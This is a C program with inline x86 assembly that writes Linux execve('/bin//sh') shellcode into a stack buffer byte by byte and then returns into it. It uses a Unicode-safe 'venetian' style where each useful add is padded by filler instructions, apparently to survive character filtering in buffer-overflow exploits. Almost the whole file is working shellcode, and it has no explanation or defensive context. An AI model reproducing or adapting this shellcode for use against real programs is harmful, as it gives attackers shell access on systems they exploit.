#include <stdio.h>
#include <string.h>

char* eax_setter(char* ptr) {
	return ptr;
}
int main() {
	char buffer[1024];
	memset(buffer, 0, sizeof(buffer));
	char *tmp = eax_setter(buffer); //set eax = &buffer[0]

	__asm__ volatile (
		"mov -0x410(%ebp),%eax;"
		"push %eax;"
		//Unicode shellcode area
		//write real shellcode at *eax
		"addb $0x6a, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x68, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x68, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x2f, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x2f, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x2f, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x73, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x68, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x2f, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x62, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x69, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x6e, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x6a, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0xb, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x58, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x89, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0xe3, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x31, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0xc9, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x99, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0xcd, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
"addb $0x80, (%eax);"
"addb %ch, (%ebp);"
"inc %eax;"
"addb %ch, (%ebp);"
//end of unicode shellcode
		"ret;"

	);

	return 0;
}